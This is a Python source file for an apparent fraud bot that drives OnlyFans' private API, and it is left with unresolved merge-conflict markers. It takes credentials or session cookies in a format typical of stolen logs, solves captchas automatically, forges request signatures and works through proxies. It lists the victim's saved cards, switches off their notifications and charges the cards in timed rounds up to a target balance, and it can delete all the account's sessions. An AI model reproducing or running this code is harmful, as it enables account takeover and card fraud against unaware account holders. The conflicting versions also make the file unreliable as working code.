"""
OnlyFans API wrapper adapted from reference script.
"""
import asyncio
import hashlib
import time
import logging
import aiohttp
<<<<<<< HEAD
import base64
import random
from urllib.parse import urlparse
import json
from typing import Dict, List, Optional, Any, Tuple
=======
from urllib.parse import urlparse
import json
from typing import Dict, List, Optional, Any
>>>>>>> bfb76ee0bfe8604ccc4920a6199fef6a02c7a55c
from bot.config import DEBUG

logger = logging.getLogger(__name__)

<<<<<<< HEAD
# Dynamic rules - matching Go DynamicRules struct
DYNAMIC_RULES = {
    "static_param": "ClXwEhOicMgBlGQ7zMt1vV2Pb7qJrLuq",
    "checksum_constant": -105,
    "checksum_indexes": [2, 2, 3, 3, 4, 7, 8, 9, 9, 11, 15, 16, 19, 22, 23, 23, 25, 25, 26, 27, 28, 28, 29, 31, 31, 31, 32, 32, 34, 35, 39, 39],
    "app_token": "33d57ade8c02dbc5a333db99ff9ae26a",
    "revision": "202502050939-12f98d453f",
    "format": "25369:%s:%x:66740a1b",  # Will be updated from remote
=======
# Dynamic rules - fetched at startup
RULES = {
    "static_param": "",
    "checksum_indexes": [],
    "checksum_constant": 0,
    "prefix": "",
    "suffix": ""
>>>>>>> bfb76ee0bfe8604ccc4920a6199fef6a02c7a55c
}


async def fetch_rules():
<<<<<<< HEAD
    """
    Fetch dynamic rules from GitHub - matches Go FetchHeader().
    URL: https://raw.githubusercontent.com/DATAHOARDERS/dynamic-rules/refs/heads/main/onlyfans.json
    """
    global DYNAMIC_RULES
    try:
        async with aiohttp.ClientSession() as session:
            headers = {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
            }
            async with session.get(
                "https://raw.githubusercontent.com/DATAHOARDERS/dynamic-rules/refs/heads/main/onlyfans.json",
                headers=headers,
=======
    """Fetch dynamic rules from GitHub."""
    global RULES
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                "https://raw.githubusercontent.com/rafa-9/dynamic-rules/main/rules.json",
>>>>>>> bfb76ee0bfe8604ccc4920a6199fef6a02c7a55c
                timeout=aiohttp.ClientTimeout(total=10)
            ) as resp:
                if resp.status == 200:
                    text = await resp.text()
<<<<<<< HEAD
                    # Handle escaped JSON string (like Go does)
                    text = text.replace('\\"', '"')
                    text = text.strip('"')
                    
                    data = json.loads(text)
                    
                    DYNAMIC_RULES["static_param"] = data.get("static_param", DYNAMIC_RULES["static_param"])
                    DYNAMIC_RULES["checksum_constant"] = int(data.get("checksum_constant", DYNAMIC_RULES["checksum_constant"]))
                    DYNAMIC_RULES["checksum_indexes"] = [int(x) for x in data.get("checksum_indexes", DYNAMIC_RULES["checksum_indexes"])]
                    
                    # Parse format string: replace {} with %s and {:x} with %x
                    fmt = data.get("format", DYNAMIC_RULES["format"])
                    fmt = fmt.replace("{}", "%s").replace("{:x}", "%x")
                    DYNAMIC_RULES["format"] = fmt
                    
                    logger.info(f"[fetch_rules] Loaded dynamic rules: static_param={DYNAMIC_RULES['static_param'][:10]}...")
=======
                    RULES = json.loads(text)
>>>>>>> bfb76ee0bfe8604ccc4920a6199fef6a02c7a55c
                    return True
                else:
                    logger.warning(f"[fetch_rules] Non-200 status: {resp.status}")
    except Exception as e:
        logger.error(f"[fetch_rules] Exception: {type(e).__name__}: {e}")
    return False


<<<<<<< HEAD
def get_xbc(user_agent: str = None) -> str:
    """
    Generate x-bc fingerprint - matches Go GetXBC().
    
    Parts: [timestamp, random1, random2, userAgent] -> base64 encode each -> join with '.' -> SHA1
    """
    if not user_agent:
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
    
    current_time = str(int(time.time()))
    
    # Generate random numbers like Go: int64(1e12 * rand.Float64())
    rand1 = str(int(1e12 * random.random()))
    rand2 = str(int(1e12 * random.random()))
    
    parts = [current_time, rand1, rand2, user_agent]
    
    # Base64 encode each part and join with '.'
    encoded_parts = [base64.b64encode(p.encode()).decode() for p in parts]
    msg = ".".join(encoded_parts)
    
    # SHA1 hash
    token = hashlib.sha1(msg.encode(), usedforsecurity=False)
    return token.hexdigest()


def generate_sign(link: str, headers: Dict[str, str]) -> Dict[str, str]:
    """
    Generate request signature - matches Go GetSignAndTime().
    
    Returns headers with 'sign' and 'time' added.
    """
    final_time = str(int(time.time()))
    
    parsed = urlparse(link)
    path = parsed.path
    if parsed.query:
        path = f"{path}?{parsed.query}"
    
    # Handle both User-Id and user-id header keys
    auth_id = headers.get("User-Id") or headers.get("user-id") or "0"
    
    # Build message: static_param\ntime\npath\nauthID
    encoded_array = [
        DYNAMIC_RULES["static_param"],
        final_time,
        path,
        auth_id
    ]
    message = "\n".join(encoded_array)
    
    # SHA1 hash
    sha1_sign = hashlib.sha1(message.encode(), usedforsecurity=False)
    sha1_sign_hex = sha1_sign.hexdigest()
    sha1_bytes = sha1_sign_hex.encode("ascii")
    
    # Calculate checksum
    checksum = DYNAMIC_RULES["checksum_constant"]
    for index in DYNAMIC_RULES["checksum_indexes"]:
        if index < len(sha1_bytes):
            checksum += sha1_bytes[index]
    
    # Format sign using the format string (e.g., "25369:%s:%x:66740a1b")
    # The format has two placeholders: %s for sha1_sign_hex, %x for checksum
    sign = DYNAMIC_RULES["format"] % (sha1_sign_hex, checksum)
    
    headers.update({
        "sign": sign,
        "time": final_time,
=======
def generate_sign(link: str, headers: Dict[str, str]) -> Dict[str, str]:
    """Generate request signature."""
    time2 = str(round(time.time() * 1000))
    
    path = urlparse(link).path
    query = urlparse(link).query
    path = path if not query else f"{path}?{query}"
    
    static_param = RULES.get("static_param", "")
    
    a = [static_param, time2, path, headers["User-Id"]]
    msg = "\n".join(a)
    
    message = msg.encode("utf-8")
    hash_object = hashlib.sha1(message, usedforsecurity=False)
    sha_1_sign = hash_object.hexdigest()
    sha_1_b = sha_1_sign.encode("ascii")
    
    checksum_indexes = RULES.get("checksum_indexes", [])
    checksum_constant = RULES.get("checksum_constant", 0)
    checksum = sum(sha_1_b[i] for i in checksum_indexes if i < len(sha_1_b)) + checksum_constant
    
    prefix = RULES.get("prefix", "")
    suffix = RULES.get("suffix", "")
    final_sign = f"{prefix}:{sha_1_sign}:{abs(checksum):x}:{suffix}"
    
    headers.update({
        "sign": final_sign,
        "time": time2,
        "x-of-rev": "202505171015-e9fb49d48d"
>>>>>>> bfb76ee0bfe8604ccc4920a6199fef6a02c7a55c
    })
    return headers


class OnlyFansAPI:
    """Async OnlyFans API client."""
    
<<<<<<< HEAD
    # Default user agent if none provided
    DEFAULT_USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
    
    def __init__(self, proxy: str = None):
        self.proxy = proxy
        self._session: Optional[aiohttp.ClientSession] = None
        
        # Session state (populated by login or cookies)
        self._uid: str = "0"
        self._sess: str = ""  # Current session
        self._old_sess: str = ""  # Old session from pre_values
        self._xbc: str = ""
        self._ua: str = self.DEFAULT_USER_AGENT
        self._xhash: str = ""
        self._csrf: str = ""  # CSRF token (called sessionId in Go)
        self._x_of_rev: str = ""  # X-Of-Rev header
        self._cookie: str = ""
        self._logged_in: bool = False
=======
    def __init__(self, proxy: str = None):
        self.proxy = proxy
        self._session: Optional[aiohttp.ClientSession] = None
>>>>>>> bfb76ee0bfe8604ccc4920a6199fef6a02c7a55c
    
    async def __aenter__(self):
        await self._ensure_session()
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.close()
    
    async def _ensure_session(self):
        if self._session is None or self._session.closed:
            self._session = aiohttp.ClientSession()
    
    async def close(self):
        if self._session and not self._session.closed:
            await self._session.close()
    
<<<<<<< HEAD
    @staticmethod
    def _generate_xbc(user_agent: str) -> str:
        """
        Generate x-bc fingerprint - uses module-level get_xbc() matching Go GetXBC().
        """
        return get_xbc(user_agent)
    
    def _get_default_headers(self) -> Dict[str, str]:
        """Base headers matching Go implementation."""
        return {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "app-token": "33d57ade8c02dbc5a333db99ff9ae26a",
            "priority": "u=1, i",
            "referer": "https://onlyfans.com/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Pragma": "no-cache",
        }
    
    def _get_headers(self, uid: str = None, sess: str = None, xbc: str = None, ua: str = None, xhash: str = None) -> Dict[str, str]:
        """Get headers using provided values or instance state - matches Go PerformRequest."""
        uid = uid or self._uid
        sess = sess or self._sess
        xbc = xbc or self._xbc
        ua = ua or self._ua
        xhash = xhash or self._xhash
        
        headers = self._get_default_headers()
        headers['User-Agent'] = ua
        headers['x-bc'] = xbc
        
        # Cookie string
        if self._cookie:
            headers['cookie'] = self._cookie
        
        # User ID
        if uid:
            headers['user-id'] = uid
        
        # X-Of-Rev (set during pre_values)
        if self._x_of_rev:
            headers['X-Of-Rev'] = self._x_of_rev
        
        # X-Hash
        if xhash:
            headers['X-Hash'] = xhash
        
        return headers
    
    async def _pre_values(self) -> Tuple[bool, str]:
        """
        Get pre-login values (CSRF, session, hash) - matches Go PreValues().
        
        Returns:
            Tuple of (success, error_message)
        """
        await self._ensure_session()
        
        # Step 1: Get X-Hash from cdn2.onlyfans.com/hash/
        self._xhash = await self.get_hash()
        if not self._xhash:
            return False, "Failed to get X-Hash"
        
        # Step 2: Get CSRF and X-Of-Rev from /users/me endpoint
        url = "https://onlyfans.com/api2/v2/users/me"
        headers = self._get_default_headers()
        headers['User-Agent'] = self._ua
        headers['x-bc'] = self._xbc
        headers['user-id'] = "0"
        headers = generate_sign(url, headers)
        
        try:
            async with self._session.get(
                url,
                headers=headers,
                proxy=self.proxy,
                timeout=aiohttp.ClientTimeout(total=30)
            ) as resp:
                # Extract X-Of-Rev from response headers
                self._x_of_rev = resp.headers.get('X-Of-Rev', '')
                
                # Extract sess cookie (this is oldSessionId in Go)
                for cookie in resp.cookies.values():
                    if cookie.key == 'sess':
                        self._old_sess = cookie.value
                
                # Parse response for CSRF
                try:
                    data = await resp.json()
                    self._csrf = data.get('csrf', '')
                except:
                    pass
                
                # Build initial cookie: lang=en; csrf=%s; fp=%s; sess=%s;
                self._cookie = f"lang=en; csrf={self._csrf}; fp={self._xbc}; sess={self._old_sess};"
                return True, ""
                
        except Exception as e:
            return False, f"Pre-values error: {str(e)}"
    
    async def login(self, email: str, password: str) -> Tuple[bool, str]:
        """
        Login with email and password.
        
        Args:
            email: Account email
            password: Account password
            
        Returns:
            Tuple of (success, error_message)
        """
        from bot.utils.captcha import solve_captcha, CaptchaSolverError
        
        await self._ensure_session()
        
        # Get pre-values first
        ok, err = await self._pre_values()
        if not ok:
            return False, f"Pre-values failed: {err}"
        
        # Encode password
        encoded_password = base64.b64encode(password.encode()).decode()
        
        # Build login payload
        post_data = {
            "email": email,
            "encodedPassword": encoded_password
        }
        
        # Solve captcha and add to payload if available
        try:
            captcha_key, captcha_token = await solve_captcha()
            if captcha_key and captcha_token:
                post_data[captcha_key] = captcha_token
                logger.info(f"[API] Captcha token added to login request")
        except CaptchaSolverError as e:
            logger.warning(f"[API] Captcha solving failed: {e}, attempting login without captcha")
        except Exception as e:
            logger.warning(f"[API] Captcha error: {e}, attempting login without captcha")
        
        url = "https://onlyfans.com/api2/v2/users/login"
        headers = self._get_headers()
        headers['Content-Type'] = 'application/json'
        headers = generate_sign(url, headers)
        
        try:
            async with self._session.post(
                url,
                headers=headers,
                json=post_data,
                proxy=self.proxy,
                timeout=aiohttp.ClientTimeout(total=30)
            ) as resp:
                body = await resp.text()
                
                if "userId" not in body:
                    if "Wrong email or password" in body or "Email is not valid" in body:
                        return False, "Invalid credentials"
                    return False, f"Login failed: {body[:200]}"
                
                data = json.loads(body)
                self._uid = str(data.get('userId', '0'))
                
                # Extract new session cookie from login response
                for cookie in resp.cookies.values():
                    if cookie.key == 'sess':
                        self._old_sess = cookie.value  # Update oldSessionId
                
                # Update cookie string: lang=en; csrf=%s; fp=%s; sess=%s; auth_id=%s;
                # Note: csrf uses self._csrf (sessionId in Go), fp uses xbc, sess uses oldSessionId
                self._cookie = f"lang=en; csrf={self._csrf}; fp={self._xbc}; sess={self._old_sess}; auth_id={self._uid};"
                self._logged_in = True
                
                logger.info(f"[API] Login successful for uid={self._uid[:8]}...")
                return True, ""
                
        except Exception as e:
            return False, f"Login error: {str(e)}"
    
    async def _init_from_cookies(self, sess: str, xbc: str, uid: str, ua: str) -> Tuple[bool, str]:
        """
        Initialize session from cookie values.
        
        Args:
            sess: Session cookie (oldSessionId)
            xbc: X-Bc fingerprint
            uid: User ID
            ua: User agent
            
        Returns:
            Tuple of (success, error_message)
        """
        self._old_sess = sess
        self._xbc = xbc
        self._uid = uid
        self._ua = ua
        self._cookie = f"lang=en; fp={xbc}; sess={sess}; auth_id={uid};"
        
        # Get hash
        self._xhash = await self.get_hash()
        if not self._xhash:
            return False, "Failed to get X-Hash"
        
        # Get X-Of-Rev by making a request to /users/me
        url = "https://onlyfans.com/api2/v2/users/me"
        headers = self._get_default_headers()
        headers['User-Agent'] = ua
        headers['x-bc'] = xbc
        headers['user-id'] = uid
        headers['cookie'] = self._cookie
        headers['X-Hash'] = self._xhash
        headers = generate_sign(url, headers)
        
        try:
            async with self._session.get(
                url,
                headers=headers,
                proxy=self.proxy,
                timeout=aiohttp.ClientTimeout(total=30)
            ) as resp:
                self._x_of_rev = resp.headers.get('X-Of-Rev', '')
        except:
            pass  # X-Of-Rev is optional
        
        self._logged_in = True
        return True, ""
    
    def _parse_credentials(self, credentials: str) -> Tuple[Optional[str], Optional[str], Optional[str]]:
        """
        Parse credentials string to extract email:pass and cookies.
        
        Format: "email:pass ... Cookies: sess:xbc:uid:ua"
        or just: "sess:xbc:uid:ua"
        
        Returns:
            Tuple of (email, password, cookies_part)
            - If email:pass found: (email, password, cookies_part)
            - If only cookies: (None, None, cookies_part)
        """
        creds = credentials.strip()
        
        # Check if credentials contain "Cookies:" marker
        cookies_markers = ["Cookies:", "cookies:", "COOKIES:"]
        cookies_part = None
        email_pass_part = None
        
        for marker in cookies_markers:
            if marker in creds:
                idx = creds.find(marker)
                email_pass_part = creds[:idx].strip()
                cookies_part = creds[idx + len(marker):].strip()
                break
        
        if cookies_part is None:
            # No marker found - assume entire string is cookies
            return None, None, creds
        
        # Try to extract email:pass from the beginning
        if email_pass_part:
            # Format is typically "email:password" at the start
            # Could have extra info between email:pass and Cookies:
            parts = email_pass_part.split(':')
            if len(parts) >= 2:
                email = parts[0].strip()
                password = parts[1].strip()
                # Validate email format loosely
                if '@' in email and '.' in email:
                    return email, password, cookies_part
        
        return None, None, cookies_part
    
=======
    def _get_default_headers(self) -> Dict[str, str]:
        return {
            "Accept": "application/json, text/plain, */*",
            "accept-encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-GB,en;q=0.9,en-US;q=0.8,fa;q=0.7",
            "app-token": "33d57ade8c02dbc5a333db99ff9ae26a",
            "Priority": "u=1, i",
            "x-of-rev": "202502050939-12f98d453f"
        }
    
    def _get_headers(self, uid: str, sess: str, xbc: str, ua: str, xhash: str) -> Dict[str, str]:
        headers = self._get_default_headers()
        cookies = '; '.join([f'fp={xbc}', f'sess={sess}', f'auth_id={uid}', 'lang=en'])
        headers.update({
            'User-Agent': ua,
            'X-Bc': xbc,
            'User-Id': uid,
            'Cookie': cookies,
            'X-Hash': xhash
        })
        return headers
    
>>>>>>> bfb76ee0bfe8604ccc4920a6199fef6a02c7a55c
    async def validate_proxy(self) -> tuple[bool, str]:
        """
        Validate proxy connectivity before loading.
        
        Returns:
            Tuple of (success, message)
        """
        await self._ensure_session()
        try:
            # Test proxy by fetching hash endpoint
            async with self._session.get(
                'https://cdn2.onlyfans.com/hash/',
                proxy=self.proxy,
                timeout=aiohttp.ClientTimeout(total=15)
            ) as resp:
                if resp.status == 200:
                    return True, "Proxy connected successfully"
                return False, f"Proxy returned status {resp.status}"
        except aiohttp.ClientProxyConnectionError as e:
            return False, f"Proxy connection failed: {str(e)}"
        except aiohttp.ClientConnectorError as e:
            return False, f"Connection error: {str(e)}"
        except asyncio.TimeoutError:
            return False, "Proxy connection timed out"
        except Exception as e:
            return False, f"Proxy error: {str(e)}"
    
    async def get_hash(self) -> Optional[str]:
        """Get the X-Hash value."""
        await self._ensure_session()
        try:
            async with self._session.get(
                'https://cdn2.onlyfans.com/hash/',
                proxy=self.proxy,
                timeout=aiohttp.ClientTimeout(total=20)
            ) as resp:
                return await resp.text()
        except Exception:
            return None
    
    async def get_me(self, headers: Dict[str, str]) -> Optional[Dict[str, Any]]:
        """Get current user info."""
        await self._ensure_session()
        url = "https://onlyfans.com/api2/v2/users/me"
        headers = generate_sign(url, headers)
        
        try:
            async with self._session.get(
                url,
                headers=headers,
                proxy=self.proxy,
                timeout=aiohttp.ClientTimeout(total=30)
            ) as resp:
                if resp.status == 200:
                    return await resp.json()
        except Exception:
            pass
        return None
    
    async def get_cards(self, headers: Dict[str, str], amount: float) -> List[str]:
        """Get available payment cards."""
        await self._ensure_session()
        url = f"https://onlyfans.com/api2/v2/payments/methods-vat?type=credit&price={amount}"
        headers = generate_sign(url, headers)
        
        try:
            async with self._session.get(
                url,
                headers=headers,
                proxy=self.proxy,
                timeout=aiohttp.ClientTimeout(total=30)
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return [card['id'] for card in data.get('cards', []) if card.get('canPayInContext')]
        except Exception:
            pass
        return []
    
    async def pay(self, headers: Dict[str, str], amount: float, card_id: str) -> Dict[str, Any]:
        """Make a payment."""
        await self._ensure_session()
        url = "https://onlyfans.com/api2/v2/payments/pay"
        headers = generate_sign(url, headers)
        
        body = {
            "isRedirectToPaymentService": False,
            "paymentType": "credit",
            "amount": amount,
            "cardId": card_id,
            "token": "",
            "unavailablePaymentGates": []
        }
        
        try:
            async with self._session.post(
                url,
                headers=headers,
                json=body,
                proxy=self.proxy,
                timeout=aiohttp.ClientTimeout(total=60)
            ) as resp:
                data = await resp.json()
                
                if not data.get("success") and DEBUG:
                    logger.error(
                        f"\n{'='*20} REQUEST FAILED {'='*20}\n"
                        f"URL: {url}\n"
                        f"Status: {resp.status}\n"
                        f"Headers: {json.dumps(headers, indent=2, default=str)}\n"
                        f"Body: {json.dumps(body, indent=2, default=str)}\n"
                        f"Response: {json.dumps(data, indent=2, default=str)}\n"
                        f"{'='*56}"
                    )
                
                return data
        except Exception as e:
            if DEBUG:
                logger.error(
                    f"\n{'='*20} REQUEST EXCEPTION {'='*20}\n"
                    f"URL: {url}\n"
                    f"Error: {str(e)}\n"
                    f"Headers: {json.dumps(headers, indent=2, default=str)}\n"
                    f"Body: {json.dumps(body, indent=2, default=str)}\n"
                    f"{'='*59}"
                )
            return {"success": False, "error": {"message": str(e)}}
    
    async def disable_notifications(self, headers: Dict[str, str]) -> bool:
        """Disable all notifications."""
        await self._ensure_session()
        url = "https://onlyfans.com/api2/v2/users/settings/notifications"
        headers = generate_sign(url, headers)
        
        body = {
            "isEmailNotificationsEnabled": False,
            "isMonthlyNewsletters": False,
            "importantSubscriptionNotifications": False,
            "notifications": {
                "toast": [
                    {"code": "new_stream", "value": False},
                    {"code": "new_subscriber_trial", "value": False},
                    {"code": "new_comment", "value": False},
                    {"code": "new_favorite", "value": False},
                    {"code": "new_subscriber", "value": False}
                ],
                "message": [
                    {"code": "new_comment", "value": False},
                    {"code": "new_favorite", "value": False},
                    {"code": "new_subscriber", "value": False},
                    {"code": "new_subscriber_trial", "value": False},
                    {"code": "promoreg_for_expired", "value": False},
                    {"code": "new_stream", "value": False},
                    {"code": "reminder_stream", "value": False}
                ]
            }
        }
        
        try:
            async with self._session.patch(
                url,
                headers=headers,
                json=body,
                proxy=self.proxy,
                timeout=aiohttp.ClientTimeout(total=30)
            ) as resp:
                return resp.status == 200
        except Exception:
            return False
    
    async def delete_sessions(self, headers: Dict[str, str]) -> bool:
        """Delete all sessions."""
        await self._ensure_session()
        url = "https://onlyfans.com/api2/v2/sessions"
        headers = generate_sign(url, headers)
        
        try:
            async with self._session.delete(
                url,
                headers=headers,
                proxy=self.proxy,
                timeout=aiohttp.ClientTimeout(total=30)
            ) as resp:
                return resp.status == 200
        except Exception:
            return False
    
    async def _smart_sleep(self, delay: float, cancel_event: asyncio.Event = None) -> None:
        """
        Sleep for delay seconds, or until cancel_event is set.
        """
        if not cancel_event:
            await asyncio.sleep(delay)
            return
            
        if cancel_event.is_set():
            return
            
        try:
            await asyncio.wait_for(cancel_event.wait(), timeout=delay)
        except asyncio.TimeoutError:
            pass

    async def load_account(
        self,
        credentials: str,
        target: float,
        amount_per_round: float = 50,
        delay: float = 210,
        retry_same_card: bool = True,
        retry_halve_on_failure: bool = False,
        progress_callback=None,
        cancel_event: asyncio.Event = None
    ) -> Dict[str, Any]:
        """
        Load an account to target balance.
        
<<<<<<< HEAD
        Tries email:pass login first if available, falls back to cookies.
        
        Args:
            credentials: Account credentials
                Format 1: "email:pass ... Cookies: sess:xbc:uid:ua" (tries login first)
                Format 2: "sess:xbc:uid:ua" (cookies only)
=======
        Args:
            credentials: Account credentials (sess:xbc:uid:ua)
>>>>>>> bfb76ee0bfe8604ccc4920a6199fef6a02c7a55c
            target: Target balance to reach
            amount_per_round: Amount to load per round
            delay: Delay between rounds in seconds
            retry_same_card: Whether to retry with same card on failure
            retry_halve_on_failure: Whether to halve amount on failure
            progress_callback: Async callback for progress updates
            cancel_event: Optional event to signal cancellation
            
        Returns:
            Dict with success, final_balance, initial_balance, cards_used, etc.
        """
        result = {
            "success": False,
            "initial_balance": 0,
            "final_balance": 0,
            "target_balance": target,
            "cards_used": 0,
            "cards_total": 0,
            "load_attempts": 0,
<<<<<<< HEAD
            "error": None,
            "auth_method": None  # 'login' or 'cookies'
        }
        
        # Parse credentials to check for email:pass
        email, password, cookies_part = self._parse_credentials(credentials)
        
        login_success = False
        
        # Try email:pass login first if available
        if email and password:
            logger.info(f"[API] Attempting email:pass login for {email[:20]}...")
            
            if progress_callback:
                await progress_callback(
                    status="Logging in with email/password...",
                    balance=0,
                    target=target,
                    card_info=None
                )
            
            # Generate xbc from default user agent for login
            self._xbc = self._generate_xbc(self._ua)
            
            login_ok, login_err = await self.login(email, password)
            if login_ok:
                login_success = True
                result["auth_method"] = "login"
                logger.info(f"[API] Email:pass login successful")
            else:
                logger.warning(f"[API] Email:pass login failed: {login_err}, falling back to cookies")
        
        # Fall back to cookies if login failed or not available
        if not login_success:
            if not cookies_part:
                result["error"] = "No valid credentials found (no email:pass or cookies)"
                return result
            
            try:
                parts = cookies_part.split(':')
                if len(parts) < 4:
                    result["error"] = f"Invalid cookies format (got {len(parts)} parts, need 4)"
                    logger.error(f"[API] Invalid cookies format: {cookies_part[:50]}...")
                    return result
                
                sess, xbc, uid = parts[0:3]
                ua = ':'.join(parts[3:])
                
                logger.info(f"[API] Using cookies for uid={uid[:8]}...")
                
                init_ok, init_err = await self._init_from_cookies(sess, xbc, uid, ua)
                if not init_ok:
                    result["error"] = f"Failed to init from cookies: {init_err}"
                    return result
                
                result["auth_method"] = "cookies"
                
            except Exception as e:
                result["error"] = f"Failed to parse cookies: {e}"
                logger.error(f"[API] Cookie parse error: {e}")
                return result
        
        # Now we're authenticated - get headers
        headers = self._get_headers()
=======
            "error": None
        }
        
        try:
            creds = credentials
            
            if "Cookies:" in credentials:
                creds = credentials.split("Cookies:")[-1].strip()
            elif "cookies:" in credentials.lower():
                idx = credentials.lower().find("cookies:")
                creds = credentials[idx + 8:].strip()
            
            parts = creds.split(':')
            if len(parts) < 4:
                result["error"] = f"Invalid credentials format (got {len(parts)} parts, need 4)"
                logger.error(f"[API] Invalid creds format: {creds[:50]}...")
                return result
            
            sess, xbc, uid = parts[0:3]
            ua = ':'.join(parts[3:])
            
            logger.debug(f"[API] Parsed credentials: uid={uid[:8]}..., sess={sess[:8]}...")
        except Exception as e:
            result["error"] = f"Failed to parse credentials: {e}"
            logger.error(f"[API] Parse error: {e}")
            return result
        
        # Get hash
        xhash = await self.get_hash()
        if not xhash:
            result["error"] = "Failed to get X-Hash (network/proxy issue)"
            logger.error(f"[API] Failed to get X-Hash for uid={uid[:8]}...")
            return result
        
        headers = self._get_headers(uid, sess, xbc, ua, xhash)
>>>>>>> bfb76ee0bfe8604ccc4920a6199fef6a02c7a55c
        
        # Get user info
        me = await self.get_me(headers)
        if not me:
<<<<<<< HEAD
            result["error"] = "Failed to get user info (session expired or invalid)"
            logger.error(f"[API] Failed to get user info for uid={self._uid[:8]}...")
=======
            result["error"] = "Failed to get user info (session expired)"
            logger.error(f"[API] Failed to get user info for uid={uid[:8]}... - session likely expired")
>>>>>>> bfb76ee0bfe8604ccc4920a6199fef6a02c7a55c
            return result
        
        balance = me.get('creditBalance', 0)
        result["initial_balance"] = balance
        result["final_balance"] = balance
        
<<<<<<< HEAD
        logger.info(f"[API] Account uid={self._uid[:8]}... initial balance=${balance}, target=${target}")
=======
        logger.info(f"[API] Account uid={uid[:8]}... initial balance=${balance}, target=${target}")
>>>>>>> bfb76ee0bfe8604ccc4920a6199fef6a02c7a55c
        
        if balance >= target:
            result["success"] = True
            logger.info(f"[API] Account already at target!")
            return result
        
        # Get cards
        cards = await self.get_cards(headers, amount_per_round)
        result["cards_total"] = len(cards)
        
        logger.info(f"[API] Found {len(cards)} valid payment cards")
        
        if not cards:
            result["error"] = "No valid payment cards found"
<<<<<<< HEAD
            logger.warning(f"[API] No valid cards for uid={self._uid[:8]}...")
=======
            logger.warning(f"[API] No valid cards for uid={uid[:8]}...")
>>>>>>> bfb76ee0bfe8604ccc4920a6199fef6a02c7a55c
            return result
        
        # Disable notifications
        await self.disable_notifications(headers)
        
        current_load_amount = amount_per_round
        max_retries = 5
        
        for i, card in enumerate(cards, 1):
            # Check for cancellation at start of each card
            if cancel_event and cancel_event.is_set():
                break
            
            card_failed = False
            result["cards_used"] = i
            
            while target > balance and not card_failed:
                # Check for cancellation
                if cancel_event and cancel_event.is_set():
                    break
                
                if target - balance > current_load_amount:
                    load_amount = current_load_amount
                else:
                    load_amount = target - balance
                
                retries = 0
                success = False
                
                while retries < max_retries:
                    # Check for cancellation before each attempt
                    if cancel_event and cancel_event.is_set():
                        break
                    
                    result["load_attempts"] += 1
                    
                    if progress_callback:
                        await progress_callback(
                            status=f"Loading ${load_amount} with card {i}/{len(cards)}",
                            balance=balance,
                            target=target,
                            card_info=f"Card {i}/{len(cards)}, Attempt {retries + 1}"
                        )
                    
                    response = await self.pay(headers, load_amount, card)
                    
                    if response.get('success', False):
                        success = True
                        current_load_amount = amount_per_round
                        break
                    else:
                        error_msg = response.get('error', {}).get('message', 'Unknown error')
                        
                        if retry_halve_on_failure and current_load_amount > 5:
                            current_load_amount = max(5, current_load_amount // 2)
                            if progress_callback:
                                await progress_callback(
                                    status=f"Halving to ${current_load_amount}",
                                    balance=balance,
                                    target=target,
                                    card_info=f"Card {i}/{len(cards)}"
                                )
                            await self._smart_sleep(5, cancel_event)
                            break
                        
                        if retry_same_card:
                            retries += 1
                            if progress_callback:
                                await progress_callback(
                                    status=f"Retry {retries}/{max_retries}: {error_msg}",
                                    balance=balance,
                                    target=target,
                                    card_info=f"Card {i}/{len(cards)}"
                                )
                            await self._smart_sleep(10, cancel_event)
                        else:
                            card_failed = True
                            break
                
                if success:
                    balance += load_amount
                    result["final_balance"] = balance
                    
                    if progress_callback:
                        await progress_callback(
                            status=f"Loaded ${load_amount}, waiting {delay}s",
                            balance=balance,
                            target=target,
                            card_info=f"Card {i}/{len(cards)}"
                        )
                    
                    if balance >= target:
                        break
                    
                    # Check for cancellation before delay
                    if cancel_event and cancel_event.is_set():
                        break
                    
                    await self._smart_sleep(delay, cancel_event)
                elif retries >= max_retries:
                    card_failed = True
            
            if balance >= target:
                break
        
        result["success"] = balance >= target
        result["final_balance"] = balance
        
        if not result["success"] and balance > result["initial_balance"]:
            result["error"] = f"Partial load: reached ${balance} of ${target}"
        elif not result["success"]:
            result["error"] = "Failed to load any balance"
        
        return result
